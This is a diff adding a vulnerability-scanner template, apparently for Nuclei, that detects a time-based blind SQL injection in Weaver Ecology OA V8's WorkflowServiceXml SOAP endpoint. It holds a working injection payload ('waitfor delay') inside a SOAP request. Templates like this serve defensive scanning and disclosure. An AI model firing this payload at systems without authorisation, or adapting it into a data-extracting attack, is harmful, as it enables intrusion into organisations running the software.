@@ -1,0 +1,53 @@
+id: weaver-ecology-oa-v8-sql-injection
+info:
+  name: Weaver Ecology OA V8 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: e-cology
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/services/WorkflowServiceXml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Invalid SOAP request"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/services/WorkflowServiceXml"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
+       <soapenv:Header/>
+       <soapenv:Body>
+        <web:getUserId>
+          <web:string>loginId = ? waitfor delay '0:0:{{t1}}' -- </web:string>
+          <web:string>zhangsan</web:string>
+        </web:getUserId>
+       </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<ns1:out>0</ns1:out>"
+        part: body
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
